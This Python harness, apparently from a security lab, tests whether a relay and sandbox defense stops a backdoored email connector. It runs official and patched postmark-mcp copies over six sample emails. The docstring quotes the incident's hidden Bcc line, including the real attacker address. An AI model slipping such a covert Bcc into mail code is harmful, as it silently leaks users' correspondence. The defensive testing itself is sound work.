"""Real third-party connectors, unmodified, behind the relay.

    python -m attacks.real_connectors --condition wirebound|relay_no_isolation|entry_approval|no_gate

Connectors (fetched by `make thirdparty` into run/thirdparty/, never committed):
  official  @activecampaign/postmark-mcp 2.1.1 from npm, unmodified. It sends with Node's native fetch to the
            hard-coded https://api.postmarkapp.com; inside the lab, NODE_USE_ENV_PROXY + HTTPS_PROXY route that
            through the egress proxy to the relay, and NODE_EXTRA_CA_CERTS makes Node trust the lab CA.
  patched   the same code with the one-line change of the Sep 2025 postmark-mcp incident
            (`Bcc: 'phan@giftshop.club'` in the sendEmail payload), defanged: the address is a lab address.
"""
from __future__ import annotations

import argparse
import asyncio
import json
import os
import sys
import time
from pathlib import Path

import httpx
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from attacks.suite import CONDITIONS, RUN, Lab, expected, log_lines, matches, tail  # noqa: E402
from wirebound.sandbox import write_profile, wrap  # noqa: E402

SENDER = "ops@acme-lab.example"
CONNECTORS = {"official": RUN / "thirdparty" / "postmark-official" / "package",
              "patched": RUN / "thirdparty" / "postmark-patched"}
CASES = [
    dict(id="R1", to="alice@example.com", subject="Invoice 1042", text="Hi Alice, your invoice is ready."),
    dict(id="R2", to="alice@example.com", cc="finance@example.com", subject="PO 77", text="Approved."),
    dict(id="R3", to="alice@example.com", bcc="audit@acme-lab.example", subject="Contract", text="Signed copy."),
    dict(id="R4", to="carol@example.net", subject="Welcome", text="Welcome aboard", html="<p>Welcome aboard</p>"),
    dict(id="R5", to="bob@example.org", reply_to="support@acme-lab.example", subject="Ticket 5", text="Resolved."),
    dict(id="R6", to="dmitri@example.com", subject="Встреча", text="Встреча в 10:00."),
]


def proposal(case: dict) -> dict:
    return {"from": SENDER, "to": case["to"], "cc": case.get("cc", ""), "bcc": case.get("bcc", ""),
            "reply_to": case.get("reply_to", ""), "subject": case["subject"], "text": case["text"],
            "html": case.get("html", "")}


async def call(lab: Lab, connector: str, case: dict, sandbox: bool, session: str) -> str:
    env = {**os.environ, "POSTMARK_SERVER_TOKEN": session, "DEFAULT_SENDER_EMAIL": SENDER,
           "DEFAULT_MESSAGE_STREAM": "outbound", "NODE_USE_ENV_PROXY": "1", "NODE_NO_WARNINGS": "1",
           "HTTPS_PROXY": f"http://127.0.0.1:{lab.ports['egress_proxy']}", "NODE_EXTRA_CA_CERTS": lab.info["ca"]}
    profile = write_profile(ROOT, lab.ports) if sandbox else None
    cmd = wrap(["node", str(CONNECTORS[connector] / "index.js")], profile)
    params = StdioServerParameters(command=cmd[0], args=cmd[1:], env=env, cwd=str(CONNECTORS[connector]))
    args = {"to": case["to"], "subject": case["subject"], "textBody": case["text"]}
    for src, dst in (("cc", "cc"), ("bcc", "bcc"), ("html", "htmlBody"), ("reply_to", "replyTo")):
        if case.get(src):
            args[dst] = case[src]
    async with stdio_client(params) as (r, w):
        async with ClientSession(r, w) as s:
            await s.initialize()
            res = await s.call_tool("sendEmail", args)
            return ("ERROR " if res.is_error else "") + " ".join(getattr(c, "text", "") for c in res.content)


def run(condition: str) -> list[dict]:
    cond = CONDITIONS[condition]
    rows = []
    with Lab(cond["mode"]) as lab:
        for connector in ("official", "patched"):
            for case in CASES:
                lab.reset()
                httpx.post(lab.ctl + "/revoke", headers={"x-principal-key": lab.key}, timeout=5)
                session = f"s{time.time_ns()}"
                ca0 = log_lines(RUN / "canary.log")
                if cond["approve"]:
                    lab.propose_and_approve(proposal(case), session)
                t0 = time.time()
                try:
                    tool = asyncio.run(call(lab, connector, case, cond["sandbox"], session))
                except Exception as exc:
                    tool = f"harness error: {type(exc).__name__}: {exc}"
                latency = time.time() - t0
                time.sleep(0.4)
                delivered = lab.delivered()
                exp = expected(case)
                exact = [d for d in delivered if matches(d, exp)]
                unapproved = [d for d in delivered if not matches(d, exp)]
                sends = httpx.get(lab.ctl + "/sends", timeout=5).json()
                row = {"condition": condition, "connector": connector, "case": case["id"], "tool_result": tool[:300],
                       "exact": len(exact), "unapproved": [u["recipients"] for u in unapproved],
                       "canary_hits": len(tail(RUN / "canary.log", ca0)), "seconds": round(latency, 2),
                       "relay": [(s["decision"], json.loads(s["reasons"])) for s in sends][-2:]}
                if connector == "official":
                    row["completed"] = len(exact) == 1 and not unapproved
                else:
                    row["harm"] = bool(unapproved) or len(exact) > 1
                rows.append(row)
                print(json.dumps({k: row[k] for k in row if k in ("connector", "case", "completed", "harm", "unapproved", "seconds")}), flush=True)
    return rows


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--condition", choices=list(CONDITIONS), required=True)
    a = ap.parse_args()
    for c, p in CONNECTORS.items():
        if not (p / "index.js").exists():
            sys.exit(f"missing {p}: run `make thirdparty` first")
    rows = run(a.condition)
    out = ROOT / "results" / "raw" / f"real_{a.condition}.jsonl"
    out.write_text("".join(json.dumps(r) + "\n" for r in rows))
    print(f"wrote {len(rows)} rows to {out}")


if __name__ == "__main__":
    main()
